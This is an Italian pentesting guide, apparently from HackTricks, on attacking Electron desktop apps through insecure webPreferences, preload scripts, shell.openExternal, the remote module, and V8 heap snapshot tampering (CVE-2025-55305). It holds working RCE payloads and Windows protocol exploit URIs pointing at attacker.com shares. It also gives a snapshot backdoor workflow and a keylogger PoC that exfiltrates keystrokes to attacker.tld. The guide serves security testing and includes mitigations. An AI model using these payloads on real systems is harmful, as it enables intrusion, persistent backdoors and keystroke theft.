# Applicazioni Desktop Electron

{{#include ../../../banners/hacktricks-training.md}}

## Introduzione

Electron combina un backend locale (con **NodeJS**) e un frontend (**Chromium**), anche se gli mancano alcuni meccanismi di sicurezza dei browser moderni.

Di solito il codice dell'app Electron si trova all'interno di un'applicazione `.asar`; per ottenere il codice è necessario estrarlo:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Nel codice sorgente di un'app Electron, all'interno di `packet.json`, è possibile trovare specificato il file `main.js` dove sono impostate le configurazioni di sicurezza.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron ha 2 tipi di processi:

- Main Process (ha accesso completo a NodeJS)
- Renderer Process (dovrebbe avere accesso a NodeJS limitato per motivi di sicurezza)

![](<../../../images/image (182).png>)

Un **renderer process** sarà una finestra del browser che carica un file:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Le impostazioni del **renderer process** possono essere **configurate** nel **main process** all'interno del file main.js. Alcune configurazioni **impediranno all'applicazione Electron di subire RCE** o altre vulnerabilità se le **impostazioni sono correttamente configurate**.

L'applicazione Electron **potrebbe accedere al dispositivo** tramite Node apis, anche se può essere configurata per impedirlo:

- **`nodeIntegration`** - è `off` per default. Se attivo, permette di accedere alle funzionalità di node dal renderer process.
- **`contextIsolation`** - è `on` per default. Se disattivato, i processi main e renderer non sono isolati.
- **`preload`** - vuoto per default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - è off per default. Restringerà le azioni che NodeJS può eseguire.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`** - è `off` per default.
- Se **`nodeIntegration`** è **abilitato**, questo permetterebbe l'uso delle **Node.js APIs** in pagine web che vengono **caricate in iframes** all'interno di un'applicazione Electron.
- Se **`nodeIntegration`** è **disabilitato**, allora i preload verranno caricati nell'iframe

Esempio di configurazione:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Alcuni **RCE payloads** da [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Cattura del traffico

Modifica la configurazione start-main e aggiungi l'uso di un proxy come:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Se puoi eseguire localmente un Electron App, è possibile farlo eseguire codice javascript arbitrario. Controlla come in:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Se il **nodeIntegration** è impostato su **on**, il JavaScript di una pagina web può usare le funzionalità di Node.js semplicemente chiamando il `require()`. Ad esempio, il modo per eseguire l'app calc su Windows è:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Lo script indicato in questa impostazione viene **caricato prima di altri script nel renderer**, quindi ha **accesso illimitato alle Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Pertanto, lo script può esportare node-features in pagine:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Se `contextIsolation` è attivo, questo non funzionerà**

## RCE: XSS + contextIsolation

La _**contextIsolation**_ introduce i **contesti separati tra gli script della pagina web e il codice JavaScript interno di Electron** in modo che l'esecuzione JavaScript di ciascun codice non si influenzi a vicenda. Questa è una funzionalità necessaria per eliminare la possibilità di RCE.

Se i contesti non sono isolati, un attacker può:

1. Eseguire **JavaScript arbitrario nel renderer** (XSS o navigazione verso siti esterni)
2. **Sovrascrivere il metodo built-in** usato in preload o nel codice interno di Electron per compromettere una funzione
3. **Innescare** l'uso della **funzione sovrascritta**
4. RCE?

Ci sono 2 posti dove i metodi built-in possono essere sovrascritti: nel codice preload o nel codice interno di Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass dell'evento click

Se sono applicate restrizioni quando clicchi un link, potresti riuscire a bypassarle **usando un clic centrale** invece di un normale clic sinistro
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Per maggiori informazioni su questi esempi consulta [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) e [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Quando si distribuisce un'app desktop Electron, è fondamentale assicurarsi che `nodeIntegration` e `contextIsolation` siano configurati correttamente. È assodato che **client-side remote code execution (RCE)** mirata agli script di preload o al codice nativo di Electron dal processo principale sia efficacemente impedita con queste impostazioni.

Quando un utente interagisce con link o apre nuove finestre, si attivano specifici event listeners, cruciali per la sicurezza e la funzionalità dell'applicazione:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Questi listener vengono **sovrascritti dall'applicazione desktop** per implementare la propria **logica applicativa**. L'applicazione valuta se un link navigato debba essere aperto internamente o in un browser web esterno. Questa decisione viene tipicamente presa da una funzione, `openInternally`. Se questa funzione restituisce `false`, indica che il link deve essere aperto esternamente, usando la funzione `shell.openExternal`.

**Here is a simplified pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Le best practice di sicurezza di Electron JS sconsigliano di accettare contenuti non attendibili con la funzione `openExternal`, poiché potrebbe portare a RCE tramite vari protocolli. I sistemi operativi supportano protocolli diversi che potrebbero innescare RCE. Per esempi dettagliati e ulteriori spiegazioni su questo argomento, si può fare riferimento a [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), che include esempi di protocolli Windows capaci di sfruttare questa vulnerabilità.

In macos, la funzione `openExternal` può essere sfruttata per eseguire comandi arbitrari, ad esempio `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Esempi di exploit di protocolli Windows includono:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Questa vuln può essere trovata in **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

La **webviewTag** è una funzionalità deprecata che permette l'uso di **NodeJS** nel **renderer process**, e dovrebbe essere disabilitata poiché consente di caricare uno script all'interno del preload context come:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Pertanto, un attaccante che riesce a caricare una pagina arbitraria potrebbe usare quel tag per **caricare uno script di preload arbitrario**.

Questo script di preload è stato poi abusato per invocare un **servizio IPC vulnerabile (`skype-new-window`)** che chiamava **`shell.openExternal`** per ottenere RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lettura di file interni: XSS + contextIsolation

**Disabilitare `contextIsolation` permette l'uso dei tag `<webview>`**, simili a `<iframe>`, per leggere ed esfiltrare file locali. Un esempio mostra come sfruttare questa vulnerabilità per leggere il contenuto di file interni:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Inoltre, viene condiviso un altro metodo per **leggere un file interno**, che mette in evidenza una critical local file read vulnerability in un'app desktop Electron. Questo comporta l'iniezione di uno script per sfruttare l'applicazione ed esfiltrare i dati:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + chromium obsoleto**

Se il **chromium** usato dall'applicazione è **obsoleto** e ci sono **note** **vulnerabilità** su di esso, potrebbe essere possibile **sfruttarlo e ottenere RCE tramite una XSS**.\
Puoi vedere un esempio in questo **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via bypass della regex degli URL interni**

Supponendo che tu abbia trovato una XSS ma **non possa attivare RCE o rubare file interni** potresti provare a usarla per **rubare credenziali via phishing**.

Per prima cosa devi sapere cosa succede quando provi ad aprire un nuovo URL, controllando il codice JS nel front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
La chiamata a **`openInternally`** deciderà se il **link** verrà **aperto** nella **finestra desktop** poiché è un link appartenente alla piattaforma, **oppure** se verrà aperto nel **browser come risorsa di terze parti**.

Nel caso la **regex** usata dalla funzione sia **vulnerabile a bypasses** (per esempio **non eseguendo l'escape dei punti dei sottodomini**) un attaccante potrebbe abusare della **XSS** per **aprire una nuova finestra che** sarà ubicata nell'infrastruttura dell'attaccante **richiedendo le credenziali** all'utente:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protocollo

Come menzionato in [la documentazione](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), le pagine eseguite su **`file://`** hanno accesso unilaterale a ogni file della tua macchina, il che significa che **problemi XSS possono essere usati per caricare file arbitrari** dalla macchina dell'utente. Usare un **protocollo personalizzato** previene problemi come questo, perché puoi limitare il protocollo a servire solo un insieme specifico di file.

## Modulo Remote

Il Modulo Remote di Electron permette ai **processi renderer di accedere alle API del processo principale**, facilitando la comunicazione all'interno di un'app Electron. Tuttavia, abilitare questo modulo introduce rischi significativi per la sicurezza. Aumenta la superficie di attacco dell'applicazione, rendendola più suscettibile a vulnerabilità come gli attacchi cross-site scripting (XSS).

> [!TIP]
> Anche se il modulo **remote** espone alcune API dal main ai renderer process, non è così semplice ottenere RCE solamente abusando dei componenti. Tuttavia, i componenti potrebbero esporre informazioni sensibili.

> [!WARNING]
> Molte app che ancora usano il remote module lo fanno in un modo che **richiede che NodeIntegration sia abilitato** nel processo renderer, il che rappresenta un **enorme rischio per la sicurezza**.

A partire da Electron 14 il modulo `remote` di Electron potrebbe essere abilitato in diversi modi e, per motivi di sicurezza e prestazioni, è **consigliato non usarlo**.

Per abilitarlo, è prima necessario **abilitarlo nel processo principale**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Poi, il processo renderer può importare oggetti dal modulo come segue:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Il **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indica alcune **funzioni** interessanti esposte dall'oggetto **`app`** del modulo 'remote':

- **`app.relaunch([options])`**
- **Riavvia** l'applicazione chiudendo l'istanza corrente e avviandone una nuova. Utile per **aggiornamenti dell'app** o cambiamenti significativi di **stato**.
- **`app.setAppLogsPath([path])`**
- **Definisce** o **crea** una directory per memorizzare i **log** dell'app. I log possono essere **recuperati** o **modificati** usando **`app.getPath()`** o **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Registra** l'eseguibile corrente come **handler predefinito** per un protocollo specificato. È possibile fornire un **percorso personalizzato** e **argomenti** se necessario.
- **`app.setUserTasks(tasks)`**
- **Aggiunge** task alla **Tasks category** nella **Jump List** (su Windows). Ogni task può controllare come l'app viene **avviata** o quali **argomenti** vengono passati.
- **`app.importCertificate(options, callback)`**
- **Importa** un certificato **PKCS#12** nello **store dei certificati** di sistema (solo Linux). Un **callback** può essere usato per gestire il risultato.
- **`app.moveToApplicationsFolder([options])`**
- **Sposta** l'applicazione nella **Applications folder** (su macOS). Aiuta a garantire una **installazione standard** per gli utenti Mac.
- **`app.setJumpList(categories)`**
- **Imposta** o **rimuove** una **Jump List** personalizzata su **Windows**. È possibile specificare **categorie** per organizzare come i task appaiono all'utente.
- **`app.setLoginItemSettings(settings)`**
- **Configura** quali **eseguibili** vengono lanciati al **login** insieme alle loro **opzioni** (solo macOS e Windows).

Esempio:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

La **API principale** per accedere alle preferenze di sistema e per **emettere eventi di sistema** in Electron. Metodi come **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, e **setUserDefault** sono tutti **parte di** questo modulo.

**Esempio d'uso:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Ascolta** le **notifiche native macOS** usando NSDistributedNotificationCenter.
* Prima di **macOS Catalina**, era possibile sniffare **tutte** le notifiche distribuite passando **nil** a CFNotificationCenterAddObserver.
* Dopo **Catalina / Big Sur**, le app sandboxate possono ancora **iscriversi** a **molti eventi** (per esempio, **blocchi/sblocchi dello schermo**, **montaggi di volume**, **attività di rete**, ecc.) registrando notifiche **per nome**.

### **getUserDefault / setUserDefault**

* **Interagisce** con **NSUserDefaults**, che memorizza le preferenze **dell'applicazione** o **globali** su macOS.

* **getUserDefault** può **recuperare** informazioni sensibili, come **posizioni di file recenti** o **posizione geografica dell'utente**.

* **setUserDefault** può **modificare** queste preferenze, potenzialmente influenzando la **configurazione** di un'app.

* Nelle **versioni più vecchie di Electron** (prima di v8.3.0), solo la **suite standard** di NSUserDefaults era **accessibile**.

## Shell.showItemInFolder

Questa funzione mostra il file indicato in un file manager, che **potrebbe eseguire automaticamente il file**.

Per maggiori informazioni consulta [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Le app Electron dovrebbero avere una **Content Security Policy (CSP)** per **prevenire attacchi XSS**. La **CSP** è uno **standard di sicurezza** che aiuta a **impedire** l'**esecuzione** di **codice non attendibile** nel browser.

Solitamente viene **configurata** nel file **`main.js`** o nel template **`index.html`** con la CSP all'interno di un **meta tag**.

Per maggiori informazioni consulta:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) è uno strumento per identificare misconfigurazioni e anti-pattern di sicurezza nelle applicazioni basate su Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) è un plugin open source per VS Code per applicazioni Electron che utilizza Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) per verificare la presenza di librerie di terze parti vulnerabili
- [**Electro.ng**](https://electro.ng/): È a pagamento

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) puoi trovare un laboratorio per sfruttare applicazioni Electron vulnerabili.

Alcuni comandi che ti aiuteranno con il laboratorio:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Backdoor locale tramite manomissione dello snapshot heap di V8 (Electron/Chromium) – CVE-2025-55305

Le app basate su Electron e Chromium deserializzano all'avvio uno snapshot heap di V8 precompilato (v8_context_snapshot.bin, e opzionalmente browser_v8_context_snapshot.bin) per inizializzare ogni V8 isolate (main, preload, renderer). Storicamente, le fuse di integrità di Electron non consideravano questi snapshot come contenuto eseguibile, quindi sfuggivano sia all'enforcement di integrità basato su fuse sia ai controlli di code-signing del sistema operativo. Di conseguenza, sostituire lo snapshot in un'installazione scrivibile dall'utente consentiva l'esecuzione stealth e persistente di codice all'interno dell'app senza modificare i binari firmati o l'ASAR.

Punti chiave
- Gap di integrità: EnableEmbeddedAsarIntegrityValidation e OnlyLoadAppFromAsar validano il JavaScript dell'applicazione all'interno dell'ASAR, ma non coprivano gli snapshot heap di V8 (CVE-2025-55305). Chromium analogamente non verifica l'integrità degli snapshot.
- Preconditions dell'attacco: scrittura locale di file nella directory di installazione dell'app. Questo è comune su sistemi dove le app Electron o i browser Chromium sono installati in percorsi scrivibili dall'utente (es., %AppData%\Local su Windows; /Applications con avvertenze su macOS).
- Effetto: esecuzione affidabile di JavaScript dell'attaccante in qualsiasi isolate mediante la sovrascrittura di un builtin usato frequentemente (un “gadget”), consentendo persistenza ed elusione della verifica di code-signing.
- Superficie interessata: app Electron (anche con le fuse abilitate) e browser basati su Chromium che caricano snapshot da posizioni scrivibili dall'utente.

Generare uno snapshot malevolo senza compilare Chromium
- Usare il prebuilt electron/mksnapshot per compilare un payload JS in uno snapshot e sovrascrivere il v8_context_snapshot.bin dell'applicazione.

Esempio di payload minimale (dimostrare l'esecuzione forzando un crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (eseguire codice diverso nel main rispetto al renderer)
- Rilevamento del main process: i globali esclusivi di Node come process.pid, process.binding(), o process.dlopen sono presenti nell'isolate del main process.
- Rilevamento Browser/renderer: i globali esclusivi del Browser come alert sono disponibili quando si esegue in un contesto del documento.

Esempio di gadget che verifica una volta le capacità Node del main process
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
Renderer/browser-context furto di dati PoC (ad es., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Workflow dell'operatore
1) Write payload.js that clobbers a common builtin (e.g., Array.isArray) and optionally branches per isolate.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Sovrascrivere i file snapshot dell'applicazione target:
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Avviare l'applicazione; il gadget viene eseguito ogni volta che il builtin scelto viene utilizzato.

Note e considerazioni
- Integrity/signature bypass: Snapshot files are not treated as native executables by code-signing checks and (historically) were not covered by Electron’s fuses or Chromium integrity controls.
- Persistence: Replacing the snapshot in a user-writable install typically survives app restarts and looks like a signed, legitimate app.
- Chromium browsers: The same tampering concept applies to Chrome/derivatives installed in user-writable locations. Chrome has other integrity mitigations but explicitly excludes physically local attacks from its threat model.

Rilevamento e mitigazioni
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
